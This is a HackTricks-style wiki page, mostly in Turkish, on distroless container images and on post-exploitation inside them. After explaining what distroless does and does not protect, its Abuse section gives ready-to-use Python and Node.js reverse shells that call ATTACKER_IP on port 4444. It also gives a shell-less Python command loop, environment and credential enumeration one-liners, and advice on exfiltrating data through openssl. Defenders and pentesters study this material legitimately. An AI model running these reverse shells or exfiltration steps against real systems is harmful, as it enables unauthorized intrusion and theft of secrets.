# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Bir **distroless** container image, **tek bir uygulamayı çalıştırmak için gereken en az runtime bileşenlerini** içeren ve paket yöneticileri, shell'ler ve geniş kapsamlı genel userland araçları gibi dağıtım araçlarını kasten kaldıran bir image'dır. Pratikte distroless image'lar genellikle sadece uygulama ikili dosyasını veya runtime'ını, paylaşılan kütüphanelerini, sertifika paketlerini ve çok küçük bir dosya sistemi düzenini içerir.

Önemli olan nokta distroless'in yeni bir kernel izolasyon ilkelisi olması değildir. Distroless bir **image tasarım stratejisidir**. Kernel'in container'ı nasıl izole ettiğini değil, container dosya sisteminin **içinde** nelerin mevcut olduğunu değiştirir. Bu ayrım önemlidir; çünkü distroless, ortamı büyük ölçüde kod çalıştırma elde edildikten sonra saldırganın kullanabileceği öğeleri azaltarak sertleştirir. Namespace'leri, seccomp'u, capabilities'leri, AppArmor'ı, SELinux'u veya başka herhangi bir runtime izolasyon mekanizmasını değiştirmez veya ikame etmez.

## Why Distroless Exists

Distroless image'lar öncelikle şu konuları azaltmak için kullanılır:

- image boyutu
- image'ın operasyonel karmaşıklığı
- güvenlik açığı içerebilecek paket ve ikili sayısı
- varsayılan olarak bir saldırganın eline geçebilecek post-exploitation araçlarının sayısı

Bu yüzden distroless image'lar üretim uygulama dağıtımlarında popülerdir. İçinde shell, paket yöneticisi ve neredeyse hiç genel araç bulunmayan bir container genellikle operasyonel olarak daha kolay anlaşılır ve ele geçirildikten sonra etkileşimli olarak kötüye kullanılması daha zordur.

İyi bilinen distroless tarzı image ailelerine örnekler:

- Google's distroless images
- Chainguard hardened/minimal images

## What Distroless Does Not Mean

Bir distroless container **şunlar anlamına gelmez**:

- otomatik olarak rootless
- otomatik olarak non-privileged
- otomatik olarak read-only
- otomatik olarak seccomp, AppArmor veya SELinux ile korunmuş
- otomatik olarak container escape'e karşı güvenli

Bir distroless image'ı `--privileged`, host namespace paylaşımı, tehlikeli bind mount'lar veya monte edilmiş bir runtime socket ile çalıştırmak hala mümkündür. Bu durumda image minimal olabilir, ama container yine de felaket derecede güvensiz olabilir. Distroless, **userland saldırı yüzeyini** değiştirir; **kernel trust boundary**'yi değiştirmez.

## Typical Operational Characteristics

Bir distroless container'ı ele geçirdiğinizde, genellikle ilk fark edeceğiniz şey yaygın varsayımların geçersizleşmesidir. `sh`, `bash`, `ls`, `id`, `cat` olmayabilir ve bazen alıştığınız tradecraft'ın beklentileriyle uyumlu davranan libc-tabanlı bir ortam bile olmayabilir. Bu hem saldırı hem savunma için etkilidir; çünkü araç eksikliği debugging, incident response ve post-exploitation süreçlerini farklılaştırır.

En yaygın kalıplar şunlardır:

- uygulama runtime'ı vardır, ama başka çok az şey vardır
- shell tabanlı payload'lar shell olmadığı için başarısız olur
- yardımcı ikililer eksik olduğu için yaygın keşif one-liner'ları başarısız olur
- read-only rootfs veya yazılabilir tmpfs lokasyonlarında `noexec` gibi dosya sistemi korumaları da sıklıkla mevcuttur

Bu kombinasyon genellikle insanların "weaponizing distroless" hakkında konuşmasına yol açar.

## Distroless And Post-Exploitation

Distroless bir ortamda asıl offensive zorluk her zaman ilk RCE değildir. Çoğunlukla asıl zorluk sonrasında ne yapılacağıdır. Eğer hedef workload bir dil runtime'ında kod çalıştırma veriyorsa (Python, Node.js, Java veya Go gibi), rastgele mantık çalıştırabiliyor olabilirsiniz ama diğer Linux hedeflerinde yaygın olan shell-merkezli iş akışlarıyla değil.

Bu nedenle post-exploitation genellikle üç yönden birine kayar:

1. **Mevcut dil runtime'ını doğrudan kullanmak** — ortamı keşfetmek, soket açmak, dosya okumak veya ek payload'lar yerleştirmek için.
2. **Kendi tooling'inizi belleğe getirmek** — dosya sistemi read-only ise veya yazılabilir lokasyonlar `noexec` olarak monte edilmişse.
3. **Image içinde zaten bulunan ikilileri kötüye kullanmak** — uygulama veya bağımlılıklar beklenmedik şekilde faydalı bir şey içeriyorsa.

## Abuse

### Enumerate The Runtime You Already Have

Birçok distroless container'da shell olmayabilir, ama yine de bir uygulama runtime'ı vardır. Hedef bir Python servisi ise Python vardır. Hedef Node.js ise Node vardır. Bu genellikle dosyaları keşfetmek, environment değişkenlerini okumak, reverse shell açmak ve `/bin/sh`'i hiç çağırmadan bellek içi yürütme hazırlamak için yeterli işlevsellik sağlar.

A simple example with Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js ile basit bir örnek:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- environment variables'ın geri kazanımı, sıklıkla credentials veya service endpoints dahil
- `/bin/ls` olmadan dosya sistemi keşfi
- yazılabilir yolların ve mount edilmiş secrets'in tespiti

### Reverse Shell `/bin/sh` Olmadan

Eğer imaj `sh` veya `bash` içermiyorsa, klasik shell-tabanlı reverse shell hemen başarısız olabilir. Bu durumda, bunun yerine yüklü language runtime'ını kullanın.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Eğer `/bin/sh` yoksa, son satırı doğrudan Python ile komut yürütme veya bir Python REPL döngüsü ile değiştirin.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Tekrar, eğer `/bin/sh` yoksa, bir shell başlatmak yerine doğrudan Node'un dosya sistemi, işlem ve ağ API'lerini kullanın.

### Tam Örnek: Kabuk Olmadan Python Komut Döngüsü

Eğer image'da Python varsa ama hiç shell yoksa, basit bir etkileşimli döngü genellikle tam post-exploitation yeteneğini sürdürmek için yeterlidir:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Bu, etkileşimli bir shell ikili dosyası gerektirmez. Etki, saldırganın perspektifinden bakıldığında aslında temel bir shell ile aynıdır: komut yürütme, enumeration ve mevcut runtime üzerinden ek payload'ların sahnelenmesi.

### Bellek İçi Araç Yürütme

Distroless image'ları sıklıkla şularla birlikte kullanılır:

- `readOnlyRootFilesystem: true`
- yazılabilir ancak `noexec` olan tmpfs (ör. `/dev/shm`)
- paket yönetimi araçlarının eksikliği

Bu kombinasyon klasik "ikili dosyayı diske indirip çalıştır" iş akışlarını güvenilmez kılar. Bu durumlarda, bellek içi yürütme teknikleri ana çözüm haline gelir.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Oradaki en ilgili teknikler şunlardır:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### İmajda Zaten Bulunan İkili Dosyalar

Bazı distroless imajlar hâlâ operasyonel olarak gerekli ikili dosyalar içerir; bunlar kompromi sonrası faydalı hale gelebilir. Sık gözlemlenen bir örnek `openssl`'dir, çünkü uygulamalar bazen crypto veya TLS ile ilgili görevler için buna ihtiyaç duyar.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` yüklüyse, şu amaçlarla kullanılabilir:

- giden TLS bağlantıları
- izin verilen bir egress kanalı üzerinden data exfiltration
- encoded/encrypted blob'lar aracılığıyla payload verisinin staging'i

Tam suistimal, gerçekte neyin yüklü olduğuna bağlıdır, ancak genel fikir şu: distroless "hiç araç yok" anlamına gelmez; normal bir dağıtım imajına göre çok daha az araç bulunduğu anlamına gelir.

## Checks

Bu kontrollerin amacı, imajın pratikte gerçekten distroless olup olmadığını ve post-exploitation için hangi runtime veya yardımcı ikili dosyaların hâlâ kullanılabilir olduğunu belirlemektir.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Burada ilginç olanlar:

- Eğer shell yoksa ancak Python veya Node gibi bir runtime varsa, post-exploitation runtime-driven execution'a yönelmelidir.
- Eğer root filesystem salt okunur (read-only) ve `/dev/shm` yazılabilir fakat `noexec` ise, bellek yürütme teknikleri çok daha önemli hale gelir.
- Eğer `openssl`, `busybox` veya `java` gibi yardımcı ikili dosyalar varsa, bunlar daha fazla erişim sağlamak için yeterli işlevsellik sunabilir.

## Runtime Varsayılanları

| Image / platform style | Varsayılan durum | Tipik davranış | Yaygın elle zayıflatma |
| --- | --- | --- | --- |
| Google distroless style images | Tasarım gereği minimal userland | Shell yok, paket yöneticisi yok, sadece uygulama/runtime bağımlılıkları | debugging katmanları eklemek, sidecar shell'ler, busybox veya araçları kopyalamak |
| Chainguard minimal images | Tasarım gereği minimal userland | Paket yüzeyi azaltılmış, genellikle tek bir runtime veya servise odaklı | `:latest-dev` veya debug varyantlarını kullanmak, build sırasında araç kopyalamak |
| Kubernetes workloads using distroless images | Pod konfigürasyonuna bağlı | Distroless sadece userland'i etkiler; Pod güvenlik duruşu hâlâ Pod spec ve runtime varsayılanlarına bağlıdır | geçici debug container'lar eklemek, host mount'ları, privileged Pod ayarları |
| Docker / Podman running distroless images | Çalıştırma flag'lerine bağlı | Minimal dosya sistemi, ancak runtime güvenliği hâlâ flag'lere ve daemon yapılandırmasına bağlıdır | `--privileged`, host namespace paylaşımı, runtime socket mount'ları, yazılabilir host bind'leri |

Önemli nokta, distroless'in bir **image property** olduğu, bir runtime koruması olmadığıdır. Değeri, ele geçirildikten sonra dosya sisteminde mevcut olanların azaltılmasından gelir.

## İlgili Sayfalar

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
